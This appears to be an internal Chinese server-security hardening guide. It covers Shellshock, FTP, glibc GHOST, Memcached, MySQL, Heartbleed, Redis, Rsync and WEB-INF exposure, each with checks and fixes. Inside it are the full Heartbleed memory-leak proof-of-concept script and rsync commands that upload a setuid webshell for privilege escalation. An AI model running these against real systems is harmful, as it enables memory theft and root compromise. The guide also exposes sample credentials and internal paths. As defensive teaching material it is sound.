![Logo](http://i4.buimg.com/2da52221413bd3bd.gif)
######5/13/2016 ###
##服务器安全相关##
###- bash漏洞##
在服务器本地执行 

	env x='() { :;}; echo vulnerable' bash -c "echo this is a test"

若系统bash存在漏洞则会打印出

	vulnerable
	this is a test
例如：
>[root@prod-pay-web02-v-z ~]# env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
this is a test

###- FTP服务器安全配置##

由于我们数据中心，兆维机房，阿里云的yum源都采用ftp方式下载rpm包，所以对ftp的安全尤为重要！

常见安全漏洞如下：

- 允许匿名用户直接登录,下载文件
- 配置不当存在弱口令
- 权限配置不当

 
修复方案

修复方案使用vsftp的配置文件作为标准

1. 禁止匿名访问

	`vim /etc/vsftpd/vsftpd.conf`

	`anonymous_enable=NO`

2.增强口令强度

避免弱口令
3) 进行访问限制

使用iptables做ACL FTP分为主动式和被动式，书写防火墙规则是要注意
3.1) 主动式

iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -p tcp  -m multiport --dport 20,21  -m state --state NEW -j ACCEPT

3.2) 被动式

vim /etc/modprobe.conf
alias ip_conntrack ip_conntract_ftp ip_nat_ftp 
vim /etc/rc.local
/sbin/modprobe ip_conntract
/sbin/modprobe ip_conntrack_ftp
/sbin/modprobe ip_nat_ftp

假设vsftpd.conf中得相关配置如下

pasv_enable=YES
pasv_min_port=2222
pasv_max_port=2225

防火墙规则可写为

	iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
	 -A INPUT -p tcp -m state --state NEW -m tcp --dport 21 -j ACCEPT
	iptables -A INPUT -p tcp --dport 2222:2225 -j ACCEPT

###- Glibc库严重安全漏洞##


1、漏洞危害

GNU glibc标准库的gethostbyname 函数爆出缓冲区溢出漏洞，漏洞编号：CVE-2015-0235。 Glibc 是提供系统调用和基本函数的 C 库，比如open, malloc, printf等等。所有动态连接的程序都要用到Glibc。远程攻击者可以利用这个漏洞执行任意代码并提升运行应用程序的用户的权限。


2、漏洞检测方法

	#include <netdb.h>   
	#include <stdio.h>   
	#include <stdlib.h>   
	#include <string.h>   
	#include <errno.h>   
	#define CANARY "in_the_coal_mine"   
	struct {   
	  char buffer[1024];   
	  char canary[sizeof(CANARY)];   
	} temp = { "buffer", CANARY };   
	int main(void) {   
	  struct hostent resbuf;   
	  struct hostent *result;   
	  int herrno;   
	  int retval;   
	  /*** strlen (name) = size_needed -sizeof (*host_addr) - sizeof (*h_addr_ptrs) - 1; ***/   
	  size_t len = sizeof(temp.buffer) -16*sizeof(unsigned char) - 2*sizeof(char *) - 1;   
	  char name[sizeof(temp.buffer)];   
	  memset(name, '0', len);   
	  name[len] = '\0';   
	  retval = gethostbyname_r(name,&resbuf, temp.buffer, sizeof(temp.buffer), &result, &herrno);   
	  if (strcmp(temp.canary, CANARY) !=0) {   
	    puts("vulnerable");   
	    exit(EXIT_SUCCESS);   
	  }   
	  if (retval == ERANGE) {   
	    puts("notvulnerable");   
	    exit(EXIT_SUCCESS);   
	  }   
	  puts("should nothappen");   
	  exit(EXIT_FAILURE);
	}

将上述代码保存为ghost.c执行

gcc GHOST.c -o GHOST

$./GHOST
vulnerable   //表示存在漏洞，需要进行修复。

$./GHOST
notvulnerable //表示修复成功。

 

3、修复方案

特别提示：由于glibc属于Linux系统基础组件，为了避免修补对您服务器造成影响，建议您选择合适时间进行修复，同时务必在修复前通过快照操作进行备份。

	CentOS 5/6/7
	
	yum update glibc
	
	Ubuntu 12/14
	
	apt-get update
	apt-get install libc6
	
	Debian 6
	
	wget -O /etc/apt/sources.list.d/debian6-lts.list http://mirrors.aliyun.com/repo/debian6-lts.list
	apt-get update
	apt-get install libc6
	
	Debian 7
	
	apt-get update
	apt-get install libc6
	
	openSUSE 13
	
	zypper refresh
	zypper update glibc*
	
	Aliyun linux 5u7
	
	wget -O /etc/yum.repos.d/aliyun-5.repo http://mirrors.aliyun.com/repo/aliyun-5.repo
	yum update glibc

###- Memcached安全配置###

Memcached服务器端都是直接通过客户端连接后直接操作，没有任何的验证过程，且Mecached默认以root权限运行。因而如果Mecached服务器直接暴露在互联网上的话是比较危险，轻则造成敏感数据泄露，重则可导致服务器被入侵。
修复方案

限定访问的IP

使用iptables限制访问IP,只允许IP为X.X.X.X的主机访问memcached：

	iptables -F
	iptables -P INPUT DROP
	iptables -A INPUT -p tcp -s X.X.X.X --dport 11211 -j ACCEPT
	iptables -A INPUT -p udp -s X.X.X.X --dport 11211 -j ACCEPT

> 通过Memcache缓存直接获取某物流网用户密码等敏感数据：http://www.wooyun.org/bugs/wooyun-2013-037301

> memcached未作IP限制导致缓存数据可被攻击者控制：http://www.wooyun.org/bugs/wooyun-2010-0790

###- MySQL安全配置##

MySQL安全配置

数据库作为数据管理的平台，它的安全性首先由系统的内部安全和网络安全两部分来决定。对于系统管理员来说，首先要保证系统本身的安全，在安装MySQL数据库时，需要对基础环境进行较好的配置。

1、修改root用户口令，删除空口令
缺省安装的MySQL的root用户是空密码的，为了安全起见，必须修改为强密码，所谓的强密码，至少8位，由字母、数字和符号组成的不规律密码。使用MySQL自带的命令mysaladmin修改root密码，同时也可以登陆数据库，修改数据库mysql下的user表的字段内容，修改方法如下所示：

	# /usr/local/mysql/bin/mysqladmin -u root password “upassword” //使用mysqladmin
	#mysql> use mysql;
	#mysql> update user set password=password('upassword') where user='root';
	#mysql> flush privileges; //强制刷新内存授权表，否则用的还是在内存缓冲的口令

2、删除默认数据库和数据库用户

一般情况下，MySQL数据库安装在本地，并且也只需要本地的php脚本对mysql进行读取，所以很多用户不需要，尤其是默认安装的用户。MySQL初始化后会自动生成空用户和test库，进行安装的测试，这会对数据库的安全构成威胁，有必要全部删除，最后的状态只保留单个root即可，当然以后根据需要增加用户和数据库。

	#mysql> show databases;
	#mysql> drop database test; //删除数据库test
	#use mysql;
	#delete from db; //删除存放数据库的表信息，因为还没有数据库信息。
	#mysql> delete from user where not (user='root') ; // 删除初始非root的用户
	#mysql> delete from user where user='root' and password=''; //删除空密码的root，尽量重复操作
	Query OK, 2 rows affected (0.00 sec)
	#mysql> flush privileges; //强制刷新内存授权表。

3、改变默认mysql管理员帐号

系统mysql的管理员名称是root，而一般情况下，数据库管理员都没进行修改，这一定程度上对系统用户穷举的恶意行为提供了便利，此时修改为复杂的用户名，请不要在设定为admin或者administraror的形式，因为它们也在易猜的用户字典中。

mysql> update user set user="newroot" where user="root"; //改成不易被猜测的用户名
mysql> flush privileges;

4、关于密码的管理

密码是数据库安全管理的一个很重要因素，不要将纯文本密码保存到数据库中。如果你的计算机有安全危险，入侵者可以获得所有的密码并使用它们。相反，应使用MD5()、SHA1()或单向哈希函数。也不要从词典中选择密码，有专门的程序可以破解它们，请选用至少八位，由字母、数字和符号组成的强密码。在存取密码时，使用mysql的内置函数password（）的sql语句，对密码进行加密后存储。例如以下方式在users表中加入新用户。

	#mysql> insert into users values (1,password(1234),'test');

5、使用独立用户运行msyql

绝对不要作为使用root用户运行MySQL服务器。这样做非常危险，因为任何具有FILE权限的用户能够用root创建文件(例如，~root/.bashrc)。mysqld拒绝使用root运行，除非使用–user=root选项明显指定。应该用普通非特权用户运行mysqld。正如前面的安装过程一样，为数据库建立独立的linux中的mysql账户，该账户用来只用于管理和运行MySQL。

要想用其它Unix用户启动mysqld，，增加user选项指定/etc/my.cnf选项文件或服务器数据目录的my.cnf选项文件中的[mysqld]组的用户名。

	#vim /etc/my.cnf
	[mysqld]
	user=mysql

该命令使服务器用指定的用户来启动，无论你手动启动或通过mysqld_safe或mysql.server启动，都能确保使用mysql的身份。也可以在启动数据库是，加上user参数。

	# /usr/local/mysql/bin/mysqld_safe --user=mysql &

作为其它linux用户而不用root运行mysqld，你不需要更改user表中的root用户名，因为MySQL账户的用户名与linux账户的用户名无关。确保mysqld运行时，只使用对数据库目录具有读或写权限的linux用户来运行。

6、禁止远程连接数据库

在命令行netstat -ant下看到，默认的3306端口是打开的，此时打开了mysqld的网络监听，允许用户远程通过帐号密码连接数本地据库，默认情况是允许远程连接数据的。为了禁止该功能，启动skip-networking，不监听sql的任何TCP/IP的连接，切断远程访问的权利，保证安全性。假如需要远程管理数据库，可通过安装PhpMyadmin来实现。假如确实需要远程连接数据库，至少修改默认的监听端口，同时添加防火墙规则，只允许可信任的网络的mysql监听端口的数据通过。

	# vim /etc/my.cf
	将#skip-networking注释去掉。
	# /usr/local/mysql/bin/mysqladmin -u root -p shutdown //停止数据库
	#/usr/local/mysql/bin/mysqld_safe --user=mysql & //后台用mysql用户启动mysql

7、限制连接用户的数量

数据库的某用户多次远程连接，会导致性能的下降和影响其他用户的操作，有必要对其进行限制。可以通过限制单个账户允许的连接数量来实现，设置my.cnf文件的mysqld中的max_user_connections变量来完成。GRANT语句也可以支持 资源控制选项来限制服务器对一个账户允许的使用范围。

	#vim /etc/my.cnf
	[mysqld]
	max_user_connections 2

8、用户目录权限限制

默认的mysql是安装在/usr/local/mysql，而对应的数据库文件在/usr/local/mysql/var目录下，因此，必须保证该目录不能让未经授权的用户访问后把数据库打包拷贝走了，所以要限制对该目录的访问。确保mysqld运行时，只使用对数据库目录具有读或写权限的linux用户来运行。

	# chown -R root  /usr/local/mysql/  //mysql主目录给root
	# chown -R mysql.mysql /usr/local/mysql/var //确保数据库目录权限所属mysql用户

9、命令历史记录保护

数据库相关的shell操作命令都会分别记录在.bash_history，如果这些文件不慎被读取，会导致数据库密码和数据库结构等信息泄露，而登陆数据库后的操作将记录在.mysql_history文件中，如果使用update表信息来修改数据库用户密码的话，也会被读取密码，因此需要删除这两个文件，同时在进行登陆或备份数据库等与密码相关操作时，应该使用-p参数加入提示输入密码后，隐式输入密码，建议将以上文件置空。

	# rm .bash_history .mysql_history  //删除历史记录
	# ln -s /dev/null .bash_history   //将shell记录文件置空
	# ln -s /dev/null .mysql_history  //将mysql记录文件置空

10、禁止MySQL对本地文件存取

在mysql中，提供对本地文件的读取，使用的是load data local infile命令，默认在5.0版本中，该选项是默认打开的，该操作令会利用MySQL把本地文件读到数据库中，然后用户就可以非法获取敏感信息了，假如你不需要读取本地文件，请务必关闭。

测试：首先在测试数据库下建立sqlfile.txt文件，用逗号隔开各个字段

	# vi sqlfile.txt
	1,sszng,111
	2,sman,222
	#mysql> load data local infile 'sqlfile.txt' into table users fields terminated by ','; //读入数据
	#mysql> select * from users;

| userid  | username   | password |

| ------- |:----------:| --------:|

|      1  |    sszng   | 111      |

|      2  |    sman    | 222      |


成功的将本地数据插入数据中，此时应该禁止MySQL中用“LOAD DATA LOCAL INFILE”命令。网络上流传的一些攻击方法中就有用它LOAD DATA LOCAL INFILE的，同时它也是很多新发现的SQL Injection攻击利用的手段！黑客还能通过使用LOAD DATALOCAL INFILE装载“/etc/passwd”进一个数据库表，然后能用SELECT显示它，这个操作对服务器的安全来说，是致命的。可以在my.cnf中添加local-infile=0，或者加参数local-infile=0启动mysql。

	#/usr/local/mysql/bin/mysqld_safe --user=mysql --local-infile=0 &
	#mysql> load data local infile 'sqlfile.txt' into table users fields terminated by ',';
	#ERROR 1148 (42000): The used command is not allowed with this MySQL version

--local-infile=0选项启动mysqld从服务器端禁用所有LOAD DATA LOCAL命令，假如需要获取本地文件，需要打开，但是建议关闭。

11、MySQL服务器权限控制

MySQL权限系统的主要功能是证实连接到一台给定主机的用户，并且赋予该用户在数据库上的SELECT、INSERT、UPDATE和DELETE等权限（详见user超级用户表）。它的附加的功能包括有匿名的用户并对于MySQL特定的功能例如LOAD DATA INFILE进行授权及管理操作的能力。

管理员可以对user，db，host等表进行配置，来控制用户的访问权限，而user表权限是超级用户权限。只把user表的权限授予超级用户如服务器或数据库主管是明智的。对其他用户，你应该把在user表中的权限设成’N'并且仅在特定数据库的基础上授权。你可以为特定的数据库、表或列授权，FILE权限给予你用LOAD DATA INFILE和SELECT … INTO OUTFILE语句读和写服务器上的文件，任何被授予FILE权限的用户都能读或写MySQL服务器能读或写的任何文件。(说明用户可以读任何数据库目录下的文件，因为服务器可以访问这些文件）。 FILE权限允许用户在MySQL服务器具有写权限的目录下创建新文件，但不能覆盖已有文件在user表的File_priv设置Y或N。，所以当你不需要对服务器文件读取时，请关闭该权限。

	#mysql> load data infile 'sqlfile.txt' into table loadfile.users fields terminated by ',';
	Query OK, 4 rows affected (0.00 sec) //读取本地信息sqlfile.txt'
	Records: 4  Deleted: 0  Skipped: 0  Warnings: 0
	#mysql> update user set File_priv='N' where user='root'; //禁止读取权限
	Query OK, 1 row affected (0.00 sec)
	Rows matched: 1  Changed: 1  Warnings: 0
	mysql> flush privileges; //刷新授权表
	Query OK, 0 rows affected (0.00 sec)
	#mysql> load data infile 'sqlfile.txt' into table users fields terminated by ','; //重登陆读取文件
	#ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: YES) //失败
	# mysql> select * from loadfile.users into outfile 'test.txt' fields terminated by ',';
	ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: YES)
为了安全起见，随时使用SHOW GRANTS语句检查查看谁已经访问了什么。然后使用REVOKE语句删除不再需要的权限。

12、使用chroot方式来控制MySQL的运行目录

Chroot是linux中的一种系统高级保护手段，它的建立会将其与主系统几乎完全隔离，也就是说，一旦遭到什么问题，也不会危及到正在运行的主系统。这是一个非常有效的办法，特别是在配置网络服务程序的时候。

13、关闭对Web访问的支持

如果不打算让Web访问使用MySQL数据库，没有提供诸如PHP这样的Web语言的时候，重新设置或编译你的PHP，取消它们对MySQL的默认支持。假如服务器中使用php等web程序，试试用Web形式非法的请求，如果得到任何形式的MySQL错误，立即分析原因，及时修改Web程序，堵住漏洞，防止MySQL暴露在web面前。
对于Web的安全检查，在MySQL官方文档中这么建议，对于web应用，至少检查以下清单：
    试试用Web形式输入单引号和双引号(‘’’和‘”’)。如果得到任何形式的MySQL错误，立即分析原因。
    试试修改动态URL，可以在其中添加%22(‘”’)、%23(‘#’)和%27(‘’’)。
    试试在动态URL中修改数据类型，使用前面示例中的字符，包括数字和字符类型。你的应用程序应足够安全，可以防范此类修改和类似攻击。
    试试输入字符、空格和特殊符号，不要输入数值字段的数字。你的应用程序应在将它们传递到MySQL之前将它们删除或生成错误。将未经过检查的值传递给MySQL是很危险的！
    将数据传给MySQL之前先检查其大小。
    用管理账户之外的用户名将应用程序连接到数据库。不要给应用程序任何不需要的访问权限。

14、数据库备份策略

一般可采用本地备份和网络备份的形式，可采用MySQL本身自带的mysqldump的方式和直接复制备份形式，

直接拷贝数据文件最为直接、快速、方便，但缺点是基本上不能实现增量备份。为了保证数据的一致性，需要在备份文件前，执行以下 SQL 语句：FLUSH TABLES WITH READ LOCK；也就是把内存中的数据都刷新到磁盘中，同时锁定数据表，以保证拷贝过程中不会有新的数据写入。这种方法备份出来的数据恢复也很简单，直接拷贝回原来的数据库目录下即可。

使用mysqldump可以把整个数据库装载到一个单独的文本文件中。这个文件包含有所有重建您的数据库所需要的SQL命令。这个命令取得所有的模式（Schema，后面有解释）并且将其转换成DDL语法（CREATE语句，即数据库定义语句），取得所有的数据，并且从这些数据中创建INSERT语句。这个工具将您的数据库中所有的设计倒转。因为所有的东西都被包含到了一个文本文件中。这个文本文件可以用一个简单的批处理和一个合适SQL语句导回到MySQL中。

使用 mysqldump进行备份非常简单，如果要备份数据库” nagios_db_backup ”，使用命令，同时使用管道gzip命令对备份文件进行压缩，建议使用异地备份的形式，可以采用Rsync等方式，将备份服务器的目录挂载到数据库服务器，将数据库文件备份打包在，通过crontab定时备份数据：

	#!/bin/sh
	time=`date +"("%F")"%R`
	$/usr/local/mysql/bin/mysqldump -u nagios -pnagios nagios | gzip >/home/sszheng/nfs58/nagiosbackup/nagios_backup.$time.gz
	# crontab -l
	# m h  dom mon dow   command
	00 00 * * * /home/sszheng/shnagios/backup.sh

恢复数据使用命令：

	gzip -d nagios_backup.\(2008-01-24\)00\:00.gz
	nagios_backup.(2008-01-24)00:00
	#mysql –u root -p nagios       <  /home/sszheng/nfs58/nagiosbackup/nagios_backup.\(2008-01-24\)12\:00

Mysqld安全相关启动选项

下列mysqld选项影响安全：

    	--allow-suspicious-udfs
该选项控制是否可以载入主函数只有xxx符的用户定义函数。默认情况下，该选项被关闭，并且只能载入至少有辅助符的UDF。这样可以防止从未包含合法UDF的共享对象文件载入函数。

   	 --local-infile[={0|1}]
如果用–local-infile=0启动服务器，则客户端不能使用LOCAL in LOAD DATA语句。

    --old-passwords
强制服务器为新密码生成短(pre-4.1)密码哈希。当服务器必须支持旧版本客户端程序时，为了保证兼容性这很有用。

     (OBSOLETE) --safe-show-database
在以前版本的MySQL中，该选项使SHOW DATABASES语句只显示用户具有部分权限的数据库名。在MySQL 5.1中，该选项不再作为现在的 默认行为使用，有一个SHOW DATABASES权限可以用来控制每个账户对数据库名的访问。

    --safe-user-create
如果启用，用户不能用GRANT语句创建新用户，除非用户有mysql.user表的INSERT权限。如果你想让用户具有授权权限来创建新用户，你应给用户授予下面的权限：

	mysql> GRANT INSERT(user) ON mysql.user TO ‘user_name’@'host_name’;
这样确保用户不能直接更改权限列，必须使用GRANT语句给其它用户授予该权限。

    --secure-auth
不允许鉴定有旧(pre-4.1)密码的账户。

    --skip-grant-tables
这个选项导致服务器根本不使用权限系统。这给每个人以完全访问所有的数据库的权力！（通过执行mysqladmin flush-privileges或mysqladmin eload命令，或执行FLUSH PRIVILEGES语句，你能告诉一个正在运行的服务器再次开始使用授权表。）

    --skip-name-resolve
主机名不被解析。所有在授权表的Host的列值必须是IP号或localhost。

    --skip-networking
在网络上不允许TCP/IP连接。所有到mysqld的连接必须经由Unix套接字进行。

    --skip-show-database
使用该选项，只允许有SHOW DATABASES权限的用户执行SHOW DATABASES语句，该语句显示所有数据库名。不使用该选项，允许所有用户执行SHOW DATABASES，但只显示用户有SHOW DATABASES权限或部分数据库权限的数据库名。请注意全局权限指数据库的权限。

###- OpenSSL心脏出血（heart bleed）漏洞##

1、漏洞简介

该漏洞可读取服务器上内存中随机64KB数据，可能导致服务器内重要的敏感信息（如用户cookie，服务器秘钥）等泄露。

无论我们自己安装的Linux系统还是阿里云自动安装的系统，openssl版本都比较低，所以要求系统在安装完后立即执行puppet客户端安装，且puppet客户端要加入openssl升级module，自动升级ssl至最新版本。
2、漏洞成因

当使用基于openssl通信的双方建立安全连接后，客户端需要不断的发送心跳信息到服务器，以确保服务器是可用的。

基本的流程是：客户端发送一段固定长度的字符串到服务器，服务器接收后，返回该固定长度的字符串。比如客户端发送“hello,world”字符串到服务器，服务器接受后，原样返回“hello,world”字符串，这样客户端就会认为openssl服务器是可用的。

客户端发送的心跳信息结构体定义为：

	struct hb {
	      int type;
	      int length;
	      unsigned char *data;                                                    
	};

其中type为心跳的类型，length为data的大小。

其中关于data字段的内容结构为：

      type字段占一个字节，payload字段占两个字节，其余的为payload的具体内容。

详情如下所示：

	字节序号        备注

	0                 type

	1-2              data中具体的内容的大小为payload

	3-len            具体的内容pl      

当服务器收到消息后，会对该消息进行解析，也就是对data中的字符串进行解析，通过解析第0位得到type，第1-2位得到payload，接着申请(1+2+payload)大小的内存，然后再将相应的数据拷贝到该新申请的内存中。

假如客户端发送的data数据为“006abcdef”，那么服务器端解析可以得到type=0, payload=06, pl='abcdef'，申请(1+2+6=9)大小的内存，然后再将type, payload, pl写到新申请的内存中。

但在存在漏洞的OpenSSL代码中包括TLS(TCP)和DTLS(UDP)都没有做边界的检测。服务器会按照payload的大小申请内存并将内存中的数据发回给客户端。 导致攻击者可以利用这个漏洞来获得TLS链接对端（可以是服务器，也可以是客户端）内存中的一些数据，至少可以获得16KB每次，理论上讲最大可以获取64KB。
3、漏洞检测及利用

利用代码：

	#!/usr/bin/python
	 
	# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
	# The author disclaims copyright to this source code.
	 
	import sys
	import struct
	import socket
	import time
	import select
	import re
	from optparse import OptionParser
	 
	options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
	options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
	 
	def h2bin(x):
	    return x.replace(' ', '').replace('\n', '').decode('hex')
	 
	hello = h2bin(''' 16 03 02 00 dc 01 00 00 d8 03 02 53 43 5b 90 9d 9b 72 0b bc 0c bc 2b 92 a8 48 97 cf bd 39 04 cc 16 0a 85 03 90 9f 77 04 33 d4 de 00 00 66 c0 14 c0 0a c0 22 c0 21 00 39 00 38 00 88 00 87 c0 0f c0 05 00 35 00 84 c0 12 c0 08 c0 1c c0 1b 00 16 00 13 c0 0d c0 03 00 0a c0 13 c0 09 c0 1f c0 1e 00 33 00 32 00 9a 00 99 00 45 00 44 c0 0e c0 04 00 2f 00 96 00 41 c0 11 c0 07 c0 0c c0 02 00 05 00 04 00 15 00 12 00 09 00 14 00 11 00 08 00 06 00 03 00 ff 01 00 00 49 00 0b 00 04 03 00 01 02 00 0a 00 34 00 32 00 0e 00 0d 00 19 00 0b 00 0c 00 18 00 09 00 0a 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0f 00 10 00 11 00 23 00 00 00 0f 00 01 01 ''')
	 
	hb = h2bin(''' 18 03 02 00 03 01 40 00 ''')
	 
	def hexdump(s):
	    for b in xrange(0, len(s), 16):
	        lin = [c for c in s[b : b + 16]]
	        hxdat = ' '.join('%02X' % ord(c) for c in lin)
	        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
	        print ' %04x: %-48s %s' % (b, hxdat, pdat)
	    print
	 
	def recvall(s, length, timeout=5):
	    endtime = time.time() + timeout
	    rdata = ''
	    remain = length
	    while remain > 0:
	        rtime = endtime - time.time() 
	        if rtime < 0:
	            return None
	        r, w, e = select.select([s], [], [], 5)
	        if s in r:
	            data = s.recv(remain)
	            # EOF?
	            if not data:
	                return None
	            rdata += data
	            remain -= len(data)
	    return rdata
	 
	 
	def recvmsg(s):
	    hdr = recvall(s, 5)
	    if hdr is None:
	        print 'Unexpected EOF receiving record header - server closed connection'
	        return None, None, None
	    typ, ver, ln = struct.unpack('>BHH', hdr)
	    pay = recvall(s, ln, 10)
	    if pay is None:
	        print 'Unexpected EOF receiving record payload - server closed connection'
	        return None, None, None
	    print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
	    return typ, ver, pay
	 
	def hit_hb(s):
	    s.send(hb)
	    while True:
	        typ, ver, pay = recvmsg(s)
	        if typ is None:
	            print 'No heartbeat response received, server likely not vulnerable'
	            return False
	 
	        if typ == 24:
	            print 'Received heartbeat response:'
	            hexdump(pay)
	            if len(pay) > 3:
	                print 'WARNING: server returned more data than it should - server is vulnerable!'
	            else:
	                print 'Server processed malformed heartbeat, but did not return any extra data.'
	            return True
	 
	        if typ == 21:
	            print 'Received alert:'
	            hexdump(pay)
	            print 'Server returned error, likely not vulnerable'
	            return False
	 
	def main():
	    opts, args = options.parse_args()
	    if len(args) < 1:
	        options.print_help()
	        return
	 
	    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	    print 'Connecting...'
	    sys.stdout.flush()
	    s.connect((args[0], opts.port))
	    print 'Sending Client Hello...'
	    sys.stdout.flush()
	    s.send(hello)
	    print 'Waiting for Server Hello...'
	    sys.stdout.flush()
	    while True:
	        typ, ver, pay = recvmsg(s)
	        if typ == None:
	            print 'Server closed connection without sending Server Hello.'
	            return
	        # Look for server hello done message.
	        if typ == 22 and ord(pay[0]) == 0x0E:
	            break
	 
	    print 'Sending heartbeat request...'
	    sys.stdout.flush()
	    s.send(hb)
	    hit_hb(s)
	 
	if __name__ == '__main__':
	    main()

使用方法

网站若存在漏洞将返回服务器中的内存数据。
4、影响范围

使用了以下版本的 OpenSSL的服务器。

OpenSSL1.0.1、1.0.1a 、1.0.1b 、1.0.1c 、1.0.1d 、1.0.1e、1.0.1f、Beta 1 of OpenSSL 1.0.2等

5、漏洞修复

升级OpenSSL到版本1.0.1g及以上。

###- Redis安全配置##

场馆云测试环境在阿里云刚部署完后，第二天便遭黑不停的向外发送大量数据包。而被黑的手段就是通过服务器上redis对外网开放且没有做认证限制！
修复方案

- 不要以root用户运行redis

- 启动redis服务时添加对访问IP的限制

- 修改运行redis的端口,编辑配置文件

		port 4321

	如果只需要本地访问，编辑配置文件

		bind 127.0.0.1

- 设定密码,编辑配置文件

		requirepass 　saidian.com

	在启动的时候需要指定配置文件的路径，这些设置才会生效

		redis-server /etc/redis.conf

- 添加防火墙

	>注意设置INPUT的默认匹配规则为REJECT，否则该规则无意义

		iptables -A INPUT -p tcp -s 192.168.17.0/24 --dport 6379 -j ACCEPT


###- Rsync安全配置##


三个机房所有数据都是通过rsync方式备份到公司服务器，所以rsync的安全也不容忽视。

rsync默认允许匿名访问,若未添加用户口令则可以进行匿名登录。 建议对rsync的IP访问进行限制以防止在用户口令被猜解或泄露时造成损失。

常用的rsync操作：

	rsync X.X.X.X:: #列出同步目录
	rsync X.X.X.X::www/ #列出同步目录中的www目录
	rsync -avz X.X.X.X::www/test.php /root #下载文件到本地
	rsync -avz X.X.X.X::www/ /var/tmp #下载目录到本地
	rsync -avz webshell.php X.X.X.X::www/ #上传本地文件到rsync服务器

利用rsync提权

rsync进程默认以root权限启动,利用rsync同步文件的同时，可以保持原来文件的权限的特性，可以使用rsync进行提权。

	chmod a+s webshell.php
	rsync -avz webshell.php X.X.X.X::www/

5、修复方案

限定访问的IP

IPTables防火墙给rsync的端口添加一个iptables。

只希望能够从内部网络（192.168.17.0/24）访问：

	iptables -A INPUT -i eth0 -p tcp -s 192.168.17.0/24 --dport 873 -m state --state NEW,ESTABLISHED -j ACCEPT
	iptables -A OUTPUT -o eth0 -p tcp --sport 873 -m state --state ESTABLISHED -j ACCEPT

在rsyncd.conf使用hosts allow设置只允许来源ip：

	hosts allow = 10.10.12.10 #允许访问的IP

添加用户口令

在rsyncd.conf中添加rsync用户权限访问：

	secrets file = /etc/rsyncd.secrets #密码文件位置，认证文件设置，设置用户名和密码
	auth users = rsync #授权帐号,认证的用户名，如果没有这行则表明是匿名，多个用户用,分隔。

###-WEB-INF/web.xml泄露####

1、web.xml简介

WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。

WEB-INF主要包含一下文件或目录：

	/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
	/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
	/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
	/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。
	/WEB-INF/database.properties：数据库配置文件

2、漏洞成因

通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。
3、漏洞检测以及利用方法

通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。

 

4、通过Nginx配置禁止访问一些铭感目录

	location ~ ^/WEB-INF/* { deny all; }

